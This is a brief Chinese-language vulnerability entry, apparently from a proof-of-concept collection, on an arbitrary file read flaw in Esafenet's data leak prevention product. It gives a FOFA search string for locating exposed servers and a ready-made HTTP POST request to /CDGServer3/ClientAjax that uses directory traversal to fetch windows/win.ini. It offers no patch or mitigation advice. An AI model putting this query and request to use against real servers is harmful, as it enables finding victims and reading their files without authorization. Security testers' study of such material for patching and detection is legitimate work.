## 亿赛通-数据泄露防护(DLP)ClientAjax接口存在任意文件读取漏洞

亿赛通-数据泄露防护是一款专门防止您的私人数据资产在分享、存储过程中，被他人非法窃取或使用的安全产品。亿赛通-数据泄露防护(DLP)ClientAjax接口存在任意文件读取漏洞。


## fofa
```
body="CDGServer3" || title="电子文档安全管理系统" || cert="esafenet" || body="/help/getEditionInfo.jsp"||body="/CDGServer3/index.jsp"
```

## poc
```
POST /CDGServer3/ClientAjax HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: 127.0.0.1
Content-Length: 102
Content-Type: application/x-www-form-urlencoded

command=downclientpak&InstallationPack=../../../../../../../../../../windows/win.ini&forward=index.jsp
```
